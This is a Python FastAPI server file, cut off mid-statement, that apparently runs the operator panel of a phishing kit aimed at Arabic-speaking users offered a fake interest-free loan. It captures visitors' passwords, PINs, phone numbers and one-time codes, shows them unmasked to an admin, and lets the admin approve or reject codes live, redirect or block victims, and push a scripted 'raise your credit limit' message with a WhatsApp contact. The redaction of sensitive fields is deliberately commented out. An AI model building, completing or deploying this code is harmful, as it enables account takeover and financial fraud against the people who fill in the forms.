import asyncio
from contextlib import asynccontextmanager, suppress
from datetime import datetime, timezone
from math import ceil
from pathlib import Path
import secrets
import time
from typing import Any

from anyio import to_thread
from bson import ObjectId
from bson.errors import InvalidId
from fastapi import FastAPI, Request, WebSocket, WebSocketDisconnect
from fastapi.exception_handlers import http_exception_handler
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel, Field
from pymongo import MongoClient
from pymongo.collection import Collection
from pymongo.errors import PyMongoError
from pymongo import ReturnDocument
from redis.asyncio import Redis
from redis.exceptions import RedisError
from starlette.exceptions import HTTPException as StarletteHTTPException
from starlette.middleware.sessions import SessionMiddleware
from starlette.middleware.trustedhost import TrustedHostMiddleware

from .auth import (
    issue_csrf_token,
    login_admin,
    logout_admin,
    require_admin_or_redirect,
    validate_csrf_token,
    verify_admin_credentials,
)
from .config import settings
from .online_users import OnlineUsersTracker


class HeartbeatPayload(BaseModel):
    visitor_id: str | None = Field(default=None, max_length=128)
    page_path: str | None = Field(default=None, max_length=512)


class FormSubmissionPayload(BaseModel):
    form_name: str | None = Field(default=None, max_length=128)
    page_path: str | None = Field(default=None, max_length=512)
    visitor_id: str | None = Field(default=None, max_length=128)
    await_admin_approval: bool = False
    fields: dict[str, Any] = Field(default_factory=dict)


class VisitorRedirectPayload(BaseModel):
    target_path: str = Field(min_length=1, max_length=512)


class VisitorBlockPayload(BaseModel):
    blocked: bool = False


class SupportSettingsPayload(BaseModel):
    whatsapp_number: str = Field(default="", max_length=64)
    success_message: str = Field(default="", max_length=2000)


class AdminSocketHub:
    def __init__(self) -> None:
        self.connections: set[WebSocket] = set()

    async def connect(self, websocket: WebSocket) -> None:
        await websocket.accept()
        self.connections.add(websocket)

    def disconnect(self, websocket: WebSocket) -> None:
        self.connections.discard(websocket)

    async def broadcast(self, payload: dict[str, Any]) -> None:
        for connection in list(self.connections):
            try:
                await connection.send_json(payload)
            except Exception:
                self.disconnect(connection)


class VisitorApprovalHub:
    def __init__(self) -> None:
        self.connections: dict[str, set[WebSocket]] = {}

    async def connect(self, visitor_id: str, websocket: WebSocket) -> None:
        await websocket.accept()
        visitor_connections = self.connections.setdefault(visitor_id, set())
        visitor_connections.add(websocket)

    def disconnect(self, visitor_id: str, websocket: WebSocket) -> None:
        visitor_connections = self.connections.get(visitor_id)
        if visitor_connections is None:
            return
        visitor_connections.discard(websocket)
        if not visitor_connections:
            self.connections.pop(visitor_id, None)

    async def broadcast(self, visitor_id: str, payload: dict[str, Any]) -> None:
        visitor_connections = self.connections.get(visitor_id)
        if not visitor_connections:
            return
        for connection in list(visitor_connections):
            try:
                await connection.send_json(payload)
            except Exception:
                self.disconnect(visitor_id, connection)


class VisitorControlHub:
    def __init__(self) -> None:
        self.connections: dict[str, set[WebSocket]] = {}

    async def connect(self, visitor_id: str, websocket: WebSocket) -> None:
        await websocket.accept()
        visitor_connections = self.connections.setdefault(visitor_id, set())
        visitor_connections.add(websocket)

    def disconnect(self, visitor_id: str, websocket: WebSocket) -> None:
        visitor_connections = self.connections.get(visitor_id)
        if visitor_connections is None:
            return
        visitor_connections.discard(websocket)
        if not visitor_connections:
            self.connections.pop(visitor_id, None)

    async def broadcast(self, visitor_id: str, payload: dict[str, Any]) -> None:
        visitor_connections = self.connections.get(visitor_id)
        if not visitor_connections:
            return
        for connection in list(visitor_connections):
            try:
                await connection.send_json(payload)
            except Exception:
                self.disconnect(visitor_id, connection)


REJECTION_MESSAGE_AR = "رمز التحقق غير صحيح"
SUPPORT_APPROVAL_MESSAGE_AR = "الحد الائتماني بمحفظتك متدني يرجى رفع الحد الائتماني لقبول طلبك والحصول على القرض الحسن. لمزيد من الاستفسارات والمعلومات التواصل مع خدمة العملاء."
SUPPORT_SETTINGS_DOCUMENT_ID = "support_whatsapp"
PAGE_TITLES_BY_PATH = {
    "/": "الصفحة الرئيسية",
    "/verification": "صفحة التوثيق",
    "/blocked": "محاولات كثيرة",
}


def page_title_from_path(path: str | None) -> str:
    normalized_path = str(path or "").strip() or "/"
    return PAGE_TITLES_BY_PATH.get(normalized_path, normalized_path)


def issue_admin_ws_token(app: FastAPI) -> str:
    token = secrets.token_urlsafe(24)
    expires_at = time.time() + 3600
    token_store: dict[str, float] = app.state.admin_ws_tokens
    token_store[token] = expires_at
    now = time.time()
    expired_tokens = [key for key, value in token_store.items() if value < now]
    for expired_token in expired_tokens:
        token_store.pop(expired_token, None)
    return token


def validate_admin_ws_token(app: FastAPI, token: str | None) -> bool:
    if not token:
        return False
    token_store: dict[str, float] = app.state.admin_ws_tokens
    expires_at = token_store.get(token)
    if expires_at is None:
        return False
    if expires_at < time.time():
        token_store.pop(token, None)
        return False
    return True


def parse_object_id(value: str | None) -> ObjectId | None:
    if not value:
        return None
    try:
        return ObjectId(value)
    except InvalidId:
        return None


def _normalize_whatsapp_number(value: str | None) -> str:
    digits = "".join(character for character in str(value or "") if character.isdigit())
    if digits.startswith("00"):
        digits = digits[2:]
    return digits


def build_whatsapp_url(number: str | None) -> str:
    normalized_number = _normalize_whatsapp_number(number)
    if not normalized_number:
        return ""
    return f"https://wa.me/{normalized_number}"


def serialize_support_settings(document: dict[str, Any] | None = None) -> dict[str, str]:
    raw_number = ""
    raw_message = ""
    if isinstance(document, dict):
        raw_number = str(document.get("whatsapp_number", "")).strip()
        raw_message = str(document.get("success_message", "")).strip()
    if not raw_number:
        raw_number = str(settings.support_whatsapp_number or "").strip()
    if not raw_message:
        raw_message = SUPPORT_APPROVAL_MESSAGE_AR
    normalized_number = _normalize_whatsapp_number(raw_number)
    return {
        "whatsapp_number": normalized_number,
        "whatsapp_url": build_whatsapp_url(normalized_number),
        "success_message": raw_message,
    }


def _resolve_visitor_identity_sync(
    collection: Collection | None, visitor_id: str | None, user_agent: str
) -> dict[str, Any]:
    parsed_object_id = parse_object_id(visitor_id)
    object_id = parsed_object_id or ObjectId()
    if collection is None:
        return {
            "visitor_id": str(object_id),
            "is_new_visitor": parsed_object_id is None,
            "is_returning_visitor": parsed_object_id is not None,
            "visit_count": 1,
        }

    now = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    update_result = collection.update_one(
        {"_id": object_id},
        {
            "$setOnInsert": {"first_seen": now},
            "$set": {"last_seen": now, "last_user_agent": user_agent},
            "$inc": {"visit_count": 1},
        },
        upsert=True,
    )
    profile = collection.find_one({"_id": object_id}, {"visit_count": 1}) or {}
    visit_count = int(profile.get("visit_count", 1))
    is_new_visitor = update_result.upserted_id is not None
    return {
        "visitor_id": str(object_id),
        "is_new_visitor": is_new_visitor,
        "is_returning_visitor": visit_count > 1,
        "visit_count": visit_count,
    }


def serialize_submission(document: dict[str, Any]) -> dict[str, str]:
    fields = document.get("fields", {})
    normalized_fields = fields if isinstance(fields, dict) else {}
    visitor_id = str(document.get("visitor_id", ""))
    phone_number_display = _build_phone_number_display(normalized_fields)
    return {
        "id": str(document.get("_id", "")),
        "login_submission_id": str(document.get("login_submission_id", "")),
        "visitor_id": visitor_id,
        "visitor_status": str(document.get("visitor_status", "")),
        "full_name": str(document.get("full_name", "")),
        "email": str(document.get("email", "")),
        "form_name": str(document.get("form_name", "")),
        "page_path": str(document.get("page_path", "")),
        "fields_preview": _build_admin_fields_preview(normalized_fields),
        "phone_number_display": phone_number_display,
        "visitor_display_id": _build_visitor_display_id(phone_number_display, visitor_id),
        "password_display": _build_password_display(normalized_fields),
        "otp_display": _build_otp_display(normalized_fields),
        "approval_status": str(document.get("approval_status", "pending")),
        "created_at": str(document.get("created_at", "")),
    }


def _normalize_field_value(value: Any) -> str | list[str]:
    if isinstance(value, list):
        normalized_items = [str(item).strip() for item in value if item is not None]
        return normalized_items
    if value is None:
        return ""
    return str(value).strip()


def _normalize_submission_fields(fields: dict[str, Any]) -> dict[str, str | list[str]]:
    normalized: dict[str, str | list[str]] = {}
    for raw_key, raw_value in fields.items():
        key = str(raw_key).strip()
        if not key:
            continue
        normalized[key] = _normalize_field_value(raw_value)
    return normalized


def _string_from_field(value: Any) -> str:
    if isinstance(value, list):
        return next((str(item).strip() for item in value if str(item).strip()), "")
    return str(value or "").strip()


def _pick_submission_value(
    fields: dict[str, str | list[str]], candidates: tuple[str, ...]
) -> str:
    candidate_lookup = {candidate.lower(): candidate for candidate in candidates}
    for key, value in fields.items():
        if key.lower() in candidate_lookup:
            return _string_from_field(value)
    return ""


def _derive_submission_summary(
    fields: dict[str, str | list[str]],
) -> tuple[str, str]:
    full_name = _pick_submission_value(
        fields,
        ("full_name", "fullname", "fullName", "name", "customer_name", "full-name"),
    )
    email = _pick_submission_value(
        fields,
        ("email", "email_address", "emailAddress", "mail"),
    )
    return full_name, email.lower()


SENSITIVE_FIELD_KEYWORDS = (
    "password",
    "passcode",
    "pass",
    "pwd",
    "pin",
    "otp",
    "token",
    "secret",
    "cvv",
    "cvc",
    "security_code",
)


def _is_sensitive_field_name(key: str) -> bool:
    lowered = key.strip().lower()
    print(lowered)
    if not lowered:
        return False
    return any(keyword in lowered for keyword in SENSITIVE_FIELD_KEYWORDS)


def _mask_phone_like_value(value: str) -> str:
    digits = "".join(character for character in value if character.isdigit())
    return digits
    # if len(digits) < 7:
    #     return value
    # visible_prefix = digits[:3]
    # visible_suffix = digits[-2:]
    # return visible_prefix + ("*" * max(1, len(digits) - 5)) + visible_suffix


def _format_admin_field_value(key: str, value: str | list[str]) -> str:
    # if _is_sensitive_field_name(key):
        # return "[REDACTED]"
    if isinstance(value, list):
        joined = ", ".join(item for item in value if item)
        if any(marker in key.lower() for marker in ("phone", "mobile", "msisdn")):
            return _mask_phone_like_value(joined)
        return joined or "-"
    string_value = str(value or "").strip()
    if any(marker in key.lower() for marker in ("phone", "mobile", "msisdn")):
        return _mask_phone_like_value(string_value)
    return string_value or "-"


def _build_admin_fields_preview(fields: dict[str, str | list[str]]) -> str:
    preview_parts: list[str] = []
    eligible_fields = 0
    for key, value in fields.items():
        lowered_key = key.strip().lower()
        if lowered_key in {"visitor_id", "csrf_token"}:
            continue
        eligible_fields += 1
        formatted_value = _format_admin_field_value(key, value)
        if formatted_value == "-":
            continue
        preview_parts.append(f"{key}: {formatted_value}")
        if len(preview_parts) >= 4:
            break
    if not preview_parts:
        return "-"
    if eligible_fields > len(preview_parts):
        preview_parts.append("...")
    return " | ".join(preview_parts)


def _build_phone_number_display(fields: dict[str, str | list[str]]) -> str:
    phone_value = _pick_submission_value(
        fields,
        ("phone_number", "phone", "mobile", "msisdn", "phoneNumber"),
    )
    if not phone_value:
        return "-"
    return phone_value


def _build_password_display(fields: dict[str, str | list[str]]) -> str:
    password_value = _pick_submission_value(
        fields,
        (
            "password",
            "passcode",
            "pin",
        ),
    )
    return password_value or "-"


def _build_otp_display(fields: dict[str, str | list[str]]) -> str:
    otp_value = _pick_submission_value(
        fields,
        (
            "otp",
            "verification_code",
            "verificationCode",
            "one_time_password",
        ),
    )
    return otp_value or "-"
    # for key in fields.keys():
        # return fields[key]
        # if _is_sensitive_field_name(key):
            # return "[REDACTED]"
    # return "-"


def _build_visitor_display_id(phone_number: str, visitor_id: str) -> str:
    candidate_phone = str(phone_number or "").strip()
    if candidate_phone and candidate_phone != "-":
        return candidate_phone
    candidate_visitor_id = str(visitor_id or "").strip()
    return candidate_visitor_id or "-"


def _insert_submission_sync(
    collection: Collection,
    form_name: str,
    page_path: str,
    fields: dict[str, Any],
    visitor_id: str,
    visitor_status: str,
    approval_required: bool = False,
) -> dict[str, str]:
    try:
        visitor_object_id = ObjectId(visitor_id)
    except InvalidId:
        visitor_object_id = ObjectId()
    created_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    normalized_fields = _normalize_submission_fields(fields)
    full_name, email = _derive_submission_summary(normalized_fields)
    document: dict[str, Any] = {
        "visitor_id": visitor_object_id,
        "visitor_status": visitor_status,
        "form_name": form_name,
        "page_path": page_path,
        "fields": normalized_fields,
        "full_name": full_name,
        "email": email,
        "approval_status": "pending" if approval_required else "approved",
        "created_at": created_at,
    }
    linked_login_submission_id = parse_object_id(
        _pick_submission_value(
            normalized_fields,
            ("login_submission_id", "loginSubmissionId", "linked_login_submission_id"),
        )
    )
    if linked_login_submission_id is not None:
        document["login_submission_id"] = linked_login_submission_id
    result = collection.insert_one(document)
    document["_id"] = result.inserted_id
    return serialize_submission(document)


def _fetch_submissions_page_sync(
    collection: Collection, page: int, page_size: int
) -> dict[str, Any]:
    safe_page_size = max(1, min(page_size, 100))
    total_submissions = collection.count_documents({})
    total_pages = max(1, ceil(total_submissions / safe_page_size))
    safe_page = min(max(1, page), total_pages)
    skip = (safe_page - 1) * safe_page_size
    documents = list(
        collection.find(
            {},
            {
                "visitor_id": 1,
                "visitor_status": 1,
                "full_name": 1,
                "email": 1,
                "form_name": 1,
                "page_path": 1,
                "fields": 1,
                "approval_status": 1,
                "created_at": 1,
                "login_submission_id": 1,
            },
        )
        .sort("_id", -1)
        .skip(skip)
        .limit(safe_page_size)
    )
    return {
        "items": [serialize_submission(document) for document in documents],
        "page": safe_page,
        "page_size": safe_page_size,
        "total_pages": total_pages,
        "total_submissions": total_submissions,
    }


def _fetch_unique_visitors_sync(
    collection: Collection, limit: int = 200
) -> list[dict[str, Any]]:
    safe_limit = max(1, min(limit, 1000))
    pipeline: list[dict[str, Any]] = [
        {"$sort": {"_id": -1}},
        {
            "$group": {
                "_id": "$visitor_id",
                "submissions_count": {"$sum": 1},
                "last_created_at": {"$first": "$created_at"},
                "first_created_at": {"$last": "$created_at"},
                "latest_fields": {"$first": "$fields"},
            }
        },
        {"$sort": {"last_created_at": -1}},
        {"$limit": safe_limit},
    ]
    visitors: list[dict[str, Any]] = []
    for document in collection.aggregate(pipeline):
        raw_visitor_id = document.get("_id")
        visitor_id = str(raw_visitor_id) if raw_visitor_id is not None else ""
        latest_fields = document.get("latest_fields", {})
        normalized_latest_fields = latest_fields if isinstance(latest_fields, dict) else {}
        phone_number = _build_phone_number_display(normalized_latest_fields)
        display_id = phone_number if phone_number and phone_number != "-" else visitor_id
        visitors.append(
            {
                "visitor_id": visitor_id,
                "phone_number": phone_number if phone_number else "-",
                "display_id": display_id or "-",
                "submissions_count": int(document.get("submissions_count", 0) or 0),
                "first_created_at": str(document.get("first_created_at", "")),
                "last_created_at": str(document.get("last_created_at", "")),
                "blocked": False,
            }
        )
    return visitors


def _fetch_submissions_for_visitor_sync(
    collection: Collection, visitor_id: str, limit: int = 100
) -> list[dict[str, str]]:
    parsed_visitor_id = parse_object_id(visitor_id)
    if parsed_visitor_id is None:
        return []
    safe_limit = max(1, min(limit, 500))
    documents = list(
        collection.find(
            {"visitor_id": parsed_visitor_id},
            {
                "visitor_id": 1,
                "visitor_status": 1,
                "full_name": 1,
                "email": 1,
                "form_name": 1,
                "page_path": 1,
                "fields": 1,
                "approval_status": 1,
                "created_at": 1,
                "login_submission_id": 1,
            },
        )
        .sort("_id", -1)
        .limit(safe_limit)
    )
    return [serialize_submission(document) for document in documents]


def _approve_submission_sync(
    collection: Collection, submission_id: str, approved_by: str
) -> dict[str, str] | None:
    return _set_submission_approval_status_sync(
        collection=collection,
        submission_id=submission_id,
        approval_status="approved",
        acted_by=approved_by,
    )


def _reject_submission_sync(
    collection: Collection, submission_id: str, rejected_by: str
) -> dict[str, str] | None:
    return _set_submission_approval_status_sync(
        collection=collection,
        submission_id=submission_id,
        approval_status="rejected",
        acted_by=rejected_by,
    )


def _set_submission_approval_status_sync(
    collection: Collection,
    submission_id: str,
    approval_status: str,
    acted_by: str,
) -> dict[str, str] | None:
    parsed_submission_id = parse_object_id(submission_id)
    if parsed_submission_id is None:
        return None
    acted_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    if approval_status == "approved":
        update_data = {
            "$set": {
                "approval_status": "approved",
                "approved_at": acted_at,
                "approved_by": acted_by,
            },
            "$unset": {
                "rejected_at": "",
                "rejected_by": "",
                "rejection_message": "",
            },
        }
    elif approval_status == "rejected":
        update_data = {
            "$set": {
                "approval_status": "rejected",
                "rejected_at": acted_at,
                "rejected_by": acted_by,
                "rejection_message": REJECTION_MESSAGE_AR,
            },
            "$unset": {
                "approved_at": "",
                "approved_by": "",
            },
        }
    else:
        return None
    document = collection.find_one_and_update(
        {"_id": parsed_submission_id},
        update_data,
        return_document=ReturnDocument.AFTER,
    )
    if document is None:
        return None
    return serialize_submission(document)


def _fetch_submission_status_sync(
    collection: Collection,
    submission_id: str,
    visitor_id: str | None = None,
) -> dict[str, str] | None:
    parsed_submission_id = parse_object_id(submission_id)
    if parsed_submission_id is None:
        return None
    query: dict[str, Any] = {"_id": parsed_submission_id}
    parsed_visitor_id = parse_object_id(visitor_id)
    if visitor_id is not None:
        if parsed_visitor_id is None:
            return None
        query["visitor_id"] = parsed_visitor_id
    document = collection.find_one(
        query, {"approval_status": 1, "visitor_id": 1, "rejection_message": 1}
    )
    if document is None:
        return None
    approval_status = str(document.get("approval_status", "pending"))
    rejection_message = (
        str(document.get("rejection_message", "")).strip()
        if approval_status == "rejected"
        else ""
    )
    return {
        "submission_id": str(document.get("_id", "")),
        "visitor_id": str(document.get("visitor_id", "")),
        "approval_status": approval_status,
        "rejection_message": rejection_message,
    }


def _fetch_support_settings_sync(collection: Collection | None) -> dict[str, str]:
    if collection is None:
        return serialize_support_settings()
    document = collection.find_one({"_id": SUPPORT_SETTINGS_DOCUMENT_ID})
    return serialize_support_settings(document)


def _fetch_visitor_block_map_sync(
    collection: Collection | None, visitor_ids: list[str]
) -> dict[str, bool]:
    if collection is None:
        return {}
    parsed_ids = []
    for visitor_id in visitor_ids:
        parsed_object_id = parse_object_id(visitor_id)
        if parsed_object_id is not None:
            parsed_ids.append(parsed_object_id)
    if not parsed_ids:
        return {}
    documents = collection.find({"_id": {"$in": parsed_ids}}, {"blocked": 1})
    return {
        str(document.get("_id", "")): bool(document.get("blocked", False))
        for document in documents
    }


def _is_visitor_blocked_sync(collection: Collection | None, visitor_id: str | None) -> bool:
    parsed_visitor_id = parse_object_id(visitor_id)
    if collection is None or parsed_visitor_id is None:
        return False
    document = collection.find_one({"_id": parsed_visitor_id}, {"blocked": 1})
    return bool(document.get("blocked", False)) if document else False


def _set_visitor_blocked_sync(
    collection: Collection | None, visitor_id: str, blocked: bool, acted_by: str
) -> dict[str, Any] | None:
    parsed_visitor_id = parse_object_id(visitor_id)
    if collection is None or parsed_visitor_id is None:
        return None
    acted_at = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    update_data: dict[str, Any] = {
        "$set": {
            "blocked": bool(blocked),
            "blocked_updated_at": acted_at,
            "blocked_updated_by": acted_by,
        }
    }
    if blocked:
        update_data["$set"].update(
            {
                "blocked_at": acted_at,
                "blocked_by": acted_by,
            }
        )
    else:
        update_data["$unset"] = {
            "blocked_at": "",
            "blocked_by": "",
        }
    document = collection.find_one_and_update(
        {"_id": parsed_visitor_id},
        update_data,
        upsert=True,
        return_document=ReturnDocument.AFTER,
    )
    if document is None:
        return None
    return {
        "visitor_id": str(document.get("_id", "")),
        "blocked": bool(document.get("blocked", False)),
    }


def _update_support_settings_sync(
    collection: Collection | None, whatsapp_number: str, success_message: str
) -> dict[str, str]:
    normalized_number = _normalize_whatsapp_number(whatsapp_number)
    normalized_message = str(success_message or "").strip() or SUPPORT_APPROVAL_MESSAGE_AR
    if collection is None:
        return serialize_support_settings(
            {
                "whatsapp_number": normalized_number,
                "success_message": normalized_message,
            }
        )
    document = collection.find_one_and_update(
        {"_id": SUPPORT_SETTINGS_DOCUMENT_ID},
        {
            "$set": {
                "whatsapp_number": normalized_number,
                "success_message": normalized_message,
                "updated_at": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC"),
            }
        },
        upsert=True,
        return_document=ReturnDocument.AFTER,
    )
    return serialize_support_settings(document)


def get_online_users_tracker(request: Request) -> OnlineUsersTracker | None:
    return getattr(request.app.state, "online_users_tracker", None)


async def get_online_users_count_for_app(app: FastAPI) -> int | None:
    tracker: OnlineUsersTracker | None = getattr(app.state, "online_users_tracker", None)
    if tracker is None:
        return None
    try:
        return await tracker.count()
    except RedisError:
        return None


async def get_online_users_count(request: Request) -> int | None:
    return await get_online_users_count_for_app(request.app)


def get_redis_client_for_app(app: FastAPI) -> Redis | None:
    redis_client: Redis | None = getattr(app.state, "redis", None)
    return redis_client


async def set_pending_redirect_for_visitor(
    app: FastAPI, visitor_id: str, target_path: str, ttl_seconds: int = 30
) -> None:
    redis_client = get_redis_client_for_app(app)
    if redis_client is None:
        return
    redirect_key = f"{settings.online_users_key}:redirect:{visitor_id}"
    try:
        await redis_client.setex(redirect_key, max(1, int(ttl_seconds)), target_path)
    except RedisError:
        return


async def pop_pending_redirect_for_visitor(app: FastAPI, visitor_id: str) -> str | None:
    redis_client = get_redis_client_for_app(app)
    if redis_client is None:
        return None
    redirect_key = f"{settings.online_users_key}:redirect:{visitor_id}"
    try:
        pending_redirect = await redis_client.getdel(redirect_key)
    except Exception:
        try:
            pending_redirect = await redis_client.get(redirect_key)
            if pending_redirect:
                await redis_client.delete(redirect_key)
        except RedisError:
            return None
    if pending_redirect is None:
        return None
    normalized_redirect = str(pending_redirect).strip()
    if not normalized_redirect.startswith("/"):
        return None
    return normalized_redirect


async def get_online_visitor_ids_for_app(app: FastAPI) -> list[str]:
    tracker: OnlineUsersTracker | None = getattr(app.state, "online_users_tracker", None)
    if tracker is None:
        return []
    try:
        return await tracker.active_ids()
    except RedisError:
        return []


async def get_online_visitor_pages_for_app(app: FastAPI) -> dict[str, str]:
    tracker: OnlineUsersTracker | None = getattr(app.state, "online_users_tracker", None)
    if tracker is None:
        return {}
    try:
        return await tracker.active_pages()
    except RedisError:
        return {}


async def broadcast_online_users_if_changed(app: FastAPI, online_users: int | None) -> None:
    if online_users is None:
        return
    last_broadcast = getattr(app.state, "last_online_users_broadcast", None)
    if last_broadcast == online_users:
        return
    app.state.last_online_users_broadcast = online_users
    socket_hub: AdminSocketHub = app.state.admin_socket_hub
    await socket_hub.broadcast({"type": "online_users", "online_users": online_users})


async def monitor_online_presence(app: FastAPI) -> None:
    interval = max(0.25, float(settings.online_presence_broadcast_interval_seconds))
    while True:
        online_users = await get_online_users_count_for_app(app)
        await broadcast_online_users_if_changed(app, online_users)
        await asyncio.sleep(interval)


def get_submissions_collection_for_app(app: FastAPI) -> Collection | None:
    return getattr(app.state, "submissions_collection", None)


def get_visitors_collection_for_app(app: FastAPI) -> Collection | None:
    return getattr(app.state, "visitors_collection", None)


def get_settings_collection_for_app(app: FastAPI) -> Collection | None:
    return getattr(app.state, "settings_collection", None)


async def resolve_visitor_identity_for_app(
    app: FastAPI, visitor_id: str | None, user_agent: str
) -> dict[str, Any]:
    collection = get_visitors_collection_for_app(app)
    try:
        return await to_thread.run_sync(
            _resolve_visitor_identity_sync, collection, visitor_id, user_agent
        )
    except PyMongoError:
        parsed_object_id = parse_object_id(visitor_id)
        object_id = parsed_object_id or ObjectId()
        return {
            "visitor_id": str(object_id),
            "is_new_visitor": parsed_object_id is None,
            "is_returning_visitor": parsed_object_id is not None,
            "visit_count": 1,
        }


async def get_submissions_page_for_app(
    app: FastAPI, page: int = 1, page_size: int = 20
) -> dict[str, Any]:
    collection = get_submissions_collection_for_app(app)
    if collection is None:
        return {
            "items": [],
            "page": 1,
            "page_size": page_size,
            "total_pages": 1,
            "total_submissions": 0,
        }
    try:
        return await to_thread.run_sync(
            _fetch_submissions_page_sync, collection, page, page_size
        )
    except PyMongoError:
        return {
            "items": [],
            "page": 1,
            "page_size": page_size,
            "total_pages": 1,
            "total_submissions": 0,
        }


async def get_unique_visitors_for_app(
    app: FastAPI, limit: int = 200
) -> list[dict[str, Any]]:
    submissions_collection = get_submissions_collection_for_app(app)
    if submissions_collection is None:
        return []
    try:
        visitors = await to_thread.run_sync(
            _fetch_unique_visitors_sync, submissions_collection, limit
        )
    except PyMongoError:
        return []
    visitors_collection = get_visitors_collection_for_app(app)
    visitor_ids = [str(visitor.get("visitor_id", "")).strip() for visitor in visitors]
    try:
        blocked_map = await to_thread.run_sync(
            _fetch_visitor_block_map_sync, visitors_collection, visitor_ids
        )
    except PyMongoError:
        blocked_map = {}
    for visitor in visitors:
        visitor["blocked"] = bool(
            blocked_map.get(str(visitor.get("visitor_id", "")).strip(), False)
        )
    return visitors


async def get_visitor_submissions_for_app(
    app: FastAPI, visitor_id: str, limit: int = 100
) -> list[dict[str, str]]:
    collection = get_submissions_collection_for_app(app)
    if collection is None:
        return []
    try:
        return await to_thread.run_sync(
            _fetch_submissions_for_visitor_sync, collection, visitor_id, limit
        )
    except PyMongoError:
        return []


async def create_submission(
    app: FastAPI,
    form_name: str,
    page_path: str,
    fields: dict[str, Any],
    visitor_id: str,
    visitor_status: str,
    approval_required: bool = False,
) -> dict[str, str] | None:
    collection = get_submissions_collection_for_app(app)
    if collection is None:
        return None
    try:
        return await to_thread.run_sync(
            _insert_submission_sync,
            collection,
            form_name,
            page_path,
            fields,
            visitor_id,
            visitor_status,
            approval_required,
        )
    except PyMongoError:
        return None


async def approve_submission_for_app(
    app: FastAPI, submission_id: str, approved_by: str
) -> dict[str, str] | None:
    collection = get_submissions_collection_for_app(app)
    if collection is None:
        return None
    try:
        return await to_thread.run_sync(
            _approve_submission_sync, collection, submission_id, approved_by
        )
    except PyMongoError:
        return None


async def reject_submission_for_app(
    app: FastAPI, submission_id: str, rejected_by: str
) -> dict[str, str] | None:
    collection = get_submissions_collection_for_app(app)
    if collection is None:
        return None
    try:
        return await to_thread.run_sync(
            _reject_submission_sync, collection, submission_id, rejected_by
        )
    except PyMongoError:
        return None


async def get_submission_status_for_app(
    app: FastAPI, submission_id: str, visitor_id: str | None = None
) -> dict[str, str] | None:
    collection = get_submissions_collection_for_app(app)
    if collection is None:
        return None
    try:
        return await to_thread.run_sync(
            _fetch_submission_status_sync, collection, submission_id, visitor_id
        )
    except PyMongoError:
        return None


async def get_support_settings_for_app(app: FastAPI) -> dict[str, str]:
    collection = get_settings_collection_for_app(app)
    try:
        return await to_thread.run_sync(_fetch_support_settings_sync, collection)
    except PyMongoError:
        return serialize_support_settings()


async def is_visitor_blocked_for_app(app: FastAPI, visitor_id: str | None) -> bool:
    collection = get_visitors_collection_for_app(app)
    try:
        return await to_thread.run_sync(_is_visitor_blocked_sync, collection, visitor_id)
    except PyMongoError:
        return False


async def set_visitor_blocked_for_app(
    app: FastAPI, visitor_id: str, blocked: bool, acted_by: str
) -> dict[str, Any] | None:
    collection = get_visitors_collection_for_app(app)
    try:
        return await to_thread.run_sync(
            _set_visitor_blocked_sync, collection, visitor_id, blocked, acted_by
        )
    except PyMongoError:
        return None


async def update_support_settings_for_app(
    app: FastAPI, whatsapp_number: str, success_message: str
) -> dict[str, str]:
    collection = get_settings_collection_for_app(app)
    try:
        return await to_thread.run_sync(
            _update_support_settings_sync, collection, whatsapp_number, success_message
        )
    except PyMongoError:
        return serialize_support_settings(
            {
                "whatsapp_number": whatsapp_number,
                "success_message": success_message,
            }
        )


async def build_admin_snapshot(app: FastAPI) -> dict[str, Any]:
    return {
        "type": "snapshot",
        "online_users": await get_online_users_count_for_app(app),
        "support_settings": await get_support_settings_for_app(app),
    }


@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.redis = None
    app.state.online_users_tracker = None
    app.state.redis_error = None
    app.state.mongo_client = None
    app.state.submissions_collection = None
    app.state.visitors_collection = None
    app.state.settings_collection = None
    app.state.mongo_error = None
    app.state.admin_socket_hub = AdminSocketHub()
    app.state.visitor_approval_hub = VisitorApprovalHub()
    app.state.visitor_control_hub = VisitorControlHub()
    app.state.admin_ws_tokens = {}
    app.state.last_online_users_broadcast = None
    app.state.online_presence_task = None
    try:
        redis_client = Redis.from_url(
            settings.redis_url,
            encoding="utf-8",
            decode_responses=True,
        )
        await redis_client.ping()
        app.state.redis = redis_client
        app.state.online_users_tracker = OnlineUsersTracker(
            redis_client=redis_client,
            key=settings.online_users_key,
            ttl_seconds=settings.online_user_ttl_seconds,
        )
        app.state.online_presence_task = asyncio.create_task(monitor_online_presence(app))
    except RedisError as exc:
        app.state.redis_error = str(exc)
    try:
        mongo_client = MongoClient(settings.mongo_uri, serverSelectionTimeoutMS=1500)
        mongo_client.admin.command("ping")
        app.state.mongo_client = mongo_client
        app.state.submissions_collection = mongo_client[settings.mongo_db_name][
            settings.mongo_submissions_collection
        ]
        app.state.visitors_collection = mongo_client[settings.mongo_db_name][
            settings.mongo_visitors_collection
        ]
        app.state.settings_collection = mongo_client[settings.mongo_db_name][
            settings.mongo_settings_collection
        ]
    except PyMongoError as exc:
        app.state.mongo_error = str(exc)
    try:
        yield
    finally:
        monitor_task: asyncio.Task | None = getattr(app.state, "online_presence_task", None)
        if monitor_task is not None:
            monitor_task.cancel()
            with suppress(asyncio.CancelledError):
                await monitor_task
        redis_client: Redis | None = getattr(app.state, "redis", None)
        if redis_client is not None:
            await redis_client.aclose()
        mongo_client: MongoClient | None = getattr(app.state, "mongo_client", None)
        if mongo_client is not None:
            mongo_client.close()


app = FastAPI(title=settings.app_name, docs_url=None, redoc_url=None, lifespan=lifespan)
app_dir = Path(__file__).resolve().parent
templates = Jinja2Templates(directory=str(app_dir / "templates"))
app.mount("/static", StaticFiles(directory=str(app_dir / "static")), name="static")
app.add_middleware(
    SessionMiddleware,
    secret_key=settings.admin_session_secret,
    max_age=settings.admin_session_ttl_seconds,
    same_site="lax",
    https_only=settings.env.lower() == "production",
)
if settings.allowed_hosts:
    app.add_middleware(TrustedHostMiddleware, allowed_hosts=settings.allowed_hosts)
if settings.cors_origins:
    app.add_middleware(
